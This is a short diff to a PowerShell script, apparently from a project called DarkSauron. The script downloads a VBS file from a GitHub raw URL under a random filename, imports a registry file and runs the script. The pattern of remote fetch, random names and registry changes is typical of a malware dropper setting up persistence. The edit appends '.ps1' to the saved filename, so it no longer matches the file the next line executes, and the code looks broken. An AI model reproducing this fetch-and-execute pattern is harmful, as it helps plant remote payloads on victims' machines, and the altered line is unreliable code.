@@ -47,7 +47,7 @@ Invoke-WebRequest  -Uri https://raw.githubusercontent.com/knightcoder77/DarkSaur
 #visual basic script to registry
 $vbs_file = random_text
 Invoke-WebRequest  -Uri https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/confirm.vbs -OutFile
-"$vbs_file.vbs"
+"$vbs_file.vbs".ps1
 
 #install the registry
 ./"$reg_file.reg";"$vbs_file.vbs"
